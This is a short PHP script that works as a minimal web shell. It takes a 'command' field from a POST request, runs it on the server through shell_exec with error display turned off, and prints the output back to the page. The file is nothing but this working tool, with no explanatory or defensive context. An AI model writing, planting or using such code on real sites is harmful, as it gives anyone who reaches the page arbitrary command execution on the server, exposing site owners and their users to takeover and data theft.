<?php
ini_set('display_errors', 0);

$getcommand = $_POST['command'] ? $_POST['command']  : 'ls';
$command = shell_exec($getcommand);
echo "command:<pre>s$command</pre>";

?>